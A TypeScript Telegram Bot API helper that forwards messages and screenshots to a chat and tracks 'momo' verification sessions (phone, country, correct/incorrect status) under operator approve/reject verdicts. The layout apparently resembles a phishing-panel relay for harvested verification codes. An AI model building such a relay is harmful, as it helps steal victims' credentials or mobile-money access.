// Server-side Telegram Bot API helper for Vercel Serverless Functions and Node.js backend

export interface TelegramCredentials {
  botToken: string;
  chatId: string;
}

export interface VerificationSession {
  status: 'pending' | 'correct' | 'incorrect';
  type?: string;
  phone?: string;
  country?: string;
  messageId?: number;
  updatedAt: number;
}

// Global in-memory session registry (shared within warm serverless instances and persistent servers)
declare global {
  // eslint-disable-next-line no-var
  var __momo_verification_sessions: Map<string, VerificationSession> | undefined;
}

if (!globalThis.__momo_verification_sessions) {
  globalThis.__momo_verification_sessions = new Map<string, VerificationSession>();
}

export const verificationSessionStore = globalThis.__momo_verification_sessions;

export function cleanEnv(val?: string): string {
  if (!val) return '';
  let s = val.trim();
  // Strip surrounding quotes
  if ((s.startsWith('"') && s.endsWith('"')) || (s.startsWith("'") && s.endsWith("'"))) {
    s = s.slice(1, -1).trim();
  }
  return s;
}

export function cleanBotToken(val?: string): string {
  let s = cleanEnv(val);
  if (!s) return '';
  // If user pasted "bot123456:ABC...", strip "bot" prefix because API URL already contains /bot<token>
  if (s.toLowerCase().startsWith('bot') && s.includes(':')) {
    s = s.slice(3).trim();
  }
  return s;
}

/**
 * Retrieve Telegram Bot Token and Chat ID securely from environment variables at runtime.
 * Evaluated on every request so runtime variables are never stale.
 */
export function getTelegramCredentials(): TelegramCredentials {
  const token = cleanBotToken(
    process.env.TELEGRAM_BOT_TOKEN ||
    process.env.BOT_TOKEN ||
    process.env.TELEGRAM_TOKEN ||
    process.env.TG_BOT_TOKEN ||
    process.env.TG_TOKEN ||
    process.env.TOKEN ||
    process.env.TELEGRAM_API_KEY ||
    process.env.TELEGRAM_API_TOKEN ||
    process.env.VITE_TELEGRAM_BOT_TOKEN ||
    process.env.VITE_BOT_TOKEN ||
    process.env.VITE_TELEGRAM_TOKEN ||
    process.env.VITE_TG_BOT_TOKEN ||
    process.env.ZITE_TELEGRAM_BOT_TOKEN ||
    ''
  );

  const chat = cleanEnv(
    process.env.TELEGRAM_CHAT_ID ||
    process.env.CHAT_ID ||
    process.env.TELEGRAM_CHATID ||
    process.env.TG_CHAT_ID ||
    process.env.CHANNEL_ID ||
    process.env.CHATID ||
    process.env.VITE_TELEGRAM_CHAT_ID ||
    process.env.VITE_CHAT_ID ||
    process.env.VITE_TELEGRAM_CHATID ||
    process.env.VITE_TG_CHAT_ID ||
    process.env.ZITE_TELEGRAM_CHAT_ID ||
    ''
  );

  return { botToken: token, chatId: chat };
}

/**
 * Explicitly disable active Telegram webhooks to ensure getUpdates polling works without 409 Conflict.
 */
export async function disableTelegramWebhook(botToken: string): Promise<boolean> {
  if (!botToken) return false;
  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/deleteWebhook?drop_pending_updates=false`, {
      method: 'POST',
    });
    const data = await res.json();
    return Boolean(data.ok);
  } catch {
    return false;
  }
}

/**
 * Safely parse incoming request body from Vercel Serverless or Express
 */
export function parseRequestBody(req: any): Record<string, any> {
  if (!req) return {};
  let body = req.body;
  if (typeof body === 'string') {
    try {
      body = JSON.parse(body);
    } catch {
      body = {};
    }
  }
  return body || {};
}

/**
 * Escape HTML special characters for Telegram HTML parse mode
 */
export function escapeHtml(text: string = ''): string {
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/**
 * Format any additional payload fields into a clean bulleted list
 */
export function formatExtraFields(input: Record<string, any>, knownKeys: string[]): string {
  const extraKeys = Object.keys(input).filter(
    (k) => !knownKeys.includes(k) && input[k] !== undefined && input[k] !== '' && typeof input[k] !== 'object'
  );
  if (extraKeys.length === 0) return '';

  const lines = extraKeys.map((k) => `• <b>${escapeHtml(k)}:</b> ${escapeHtml(String(input[k]))}`);
  return `\n\n📋 <b>Additional Details:</b>\n${lines.join('\n')}`;
}

/**
 * Send a message via Telegram Bot API with automatic HTML-to-Plain-Text fallback
 */
export async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  htmlText: string,
  inlineKeyboard?: Array<Array<{ text: string; callback_data: string }>>
): Promise<{ ok: boolean; result?: any; description?: string; error_code?: number }> {
  if (!botToken || !chatId) {
    console.error('[Telegram API] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID environment variables.');
    return { ok: false, description: 'Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID' };
  }

  const payload: any = {
    chat_id: chatId,
    text: htmlText,
    parse_mode: 'HTML',
  };

  if (inlineKeyboard && inlineKeyboard.length > 0) {
    payload.reply_markup = { inline_keyboard: inlineKeyboard };
  }

  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    const data = (await res.json()) as { ok: boolean; result?: any; description?: string; error_code?: number };
    
    if (!data.ok) {
      console.warn(`[Telegram API Warning] HTML sendMessage failed (Code ${data.error_code}): ${data.description}. Attempting plain-text retry.`);
      
      const plainText = htmlText
        .replace(/<b>(.*?)<\/b>/gi, '$1')
        .replace(/<i>(.*?)<\/i>/gi, '$1')
        .replace(/<pre>([\s\S]*?)<\/pre>/gi, '$1')
        .replace(/<code>(.*?)<\/code>/gi, '$1')
        .replace(/&amp;/g, '&')
        .replace(/&lt;/g, '<')
        .replace(/&gt;/g, '>')
        .replace(/&quot;/g, '"');

      payload.text = plainText;
      delete payload.parse_mode;

      const retryRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const retryData = (await retryRes.json()) as any;
      if (!retryData.ok) {
        console.error(`[Telegram API Error] Plain-text retry also failed: ${retryData.description} (Code ${retryData.error_code})`);
      } else {
        console.log('[Telegram API] Message sent successfully via plain-text fallback.');
      }
      return retryData;
    }

    console.log('[Telegram API] Message sent successfully to chatId (ends with ...' + chatId.slice(-4) + ')');
    return data;
  } catch (err: any) {
    console.error('[Telegram API Network Error] Failed to contact api.telegram.org:', err.message || err);
    return { ok: false, description: String(err.message || err) };
  }
}

/**
 * Send a photo via Telegram Bot API with automatic format handling
 */
export async function sendTelegramPhoto(
  botToken: string,
  chatId: string,
  photoDataUrlOrBase64: string,
  captionHtml?: string
): Promise<{ ok: boolean; result?: any; description?: string }> {
  if (!botToken || !chatId) {
    console.error('[Telegram API] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    return { ok: false, description: 'Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID' };
  }

  try {
    let mimeType = 'image/jpeg';
    let base64Data = photoDataUrlOrBase64;

    if (photoDataUrlOrBase64.includes(';base64,')) {
      const parts = photoDataUrlOrBase64.split(';base64,');
      mimeType = parts[0].replace(/^data:/, '') || 'image/jpeg';
      base64Data = parts[1];
    }

    const buffer = Buffer.from(base64Data, 'base64');
    const blob = new Blob([buffer], { type: mimeType });

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'screenshot.jpg');
    if (captionHtml) {
      formData.append('caption', captionHtml);
      formData.append('parse_mode', 'HTML');
    }

    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });

    const data = (await res.json()) as any;
    if (!data.ok) {
      console.warn('[Telegram API Warning] sendPhoto failed:', data.description);
    } else {
      console.log('[Telegram API] Photo forwarded successfully to Telegram!');
    }
    return data;
  } catch (err: any) {
    console.error('[Telegram API] Failed to forward photo to Telegram:', err.message || err);
    return { ok: false, description: String(err.message || err) };
  }
}

/**
 * Answer Telegram callback query (shows notification toast in Telegram client)
 */
export async function answerTelegramCallback(
  botToken: string,
  callbackQueryId: string,
  text: string
): Promise<boolean> {
  if (!botToken || !callbackQueryId) return false;
  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text,
      }),
    });
    return res.ok;
  } catch (err) {
    console.error('[Telegram API] Failed to answer callback query:', err);
    return false;
  }
}

/**
 * Update Telegram message text and remove interactive buttons once decided
 */
export async function editTelegramMessageVerdict(
  botToken: string,
  chatId: string | number,
  messageId: number,
  originalText: string,
  isApproved: boolean
): Promise<boolean> {
  if (!botToken || !chatId || !messageId) return false;
  try {
    const verdictBanner = isApproved ? '\n\n✅ <b>VERDICT: APPROVED</b>' : '\n\n❌ <b>VERDICT: REJECTED</b>';
    const res = await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: escapeHtml(originalText) + verdictBanner,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [] },
      }),
    });
    return res.ok;
  } catch (err) {
    console.error('[Telegram API] Failed to edit message verdict:', err);
    return false;
  }
}

/**
 * Safe server-side Telegram Diagnostics (never exposes bot token or private data)
 */
export async function getSafeTelegramDiagnostics() {
  const { botToken, chatId } = getTelegramCredentials();

  let botInfo: any = null;
  let botConnected = false;
  let webhookInfo: any = null;

  if (botToken) {
    try {
      const getMeRes = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
      if (getMeRes.ok) {
        const getMeData = (await getMeRes.json()) as any;
        if (getMeData.ok && getMeData.result) {
          botConnected = true;
          botInfo = {
            id: getMeData.result.id,
            username: getMeData.result.username ? `@${getMeData.result.username}` : null,
            firstName: getMeData.result.first_name,
            isBot: getMeData.result.is_bot,
          };
        }
      }
    } catch (err: any) {
      console.warn('[Telegram Diagnostics] getMe request error:', err.message);
    }

    try {
      const webhookRes = await fetch(`https://api.telegram.org/bot${botToken}/getWebhookInfo`);
      if (webhookRes.ok) {
        const webhookData = (await webhookRes.json()) as any;
        if (webhookData.ok && webhookData.result) {
          webhookInfo = {
            url: webhookData.result.url || '(none - getUpdates polling mode)',
            hasCustomCertificate: webhookData.result.has_custom_certificate,
            pendingUpdateCount: webhookData.result.pending_update_count || 0,
            lastErrorDate: webhookData.result.last_error_date
              ? new Date(webhookData.result.last_error_date * 1000).toISOString()
              : null,
            lastErrorMessage: webhookData.result.last_error_message || null,
            maxConnections: webhookData.result.max_connections,
            ipAddress: webhookData.result.ip_address || null,
          };
        }
      }
    } catch (err: any) {
      console.warn('[Telegram Diagnostics] getWebhookInfo request error:', err.message);
    }
  }

  return {
    environment: process.env.VERCEL ? 'vercel-production' : 'development-server',
    timestamp: new Date().toISOString(),
    configuration: {
      botTokenConfigured: Boolean(botToken),
      chatIdConfigured: Boolean(chatId),
      chatIdMasked: chatId ? `***${chatId.slice(-4)}` : 'not_configured',
    },
    telegramBot: {
      connected: botConnected,
      bot: botInfo,
    },
    webhook: webhookInfo,
  };
}
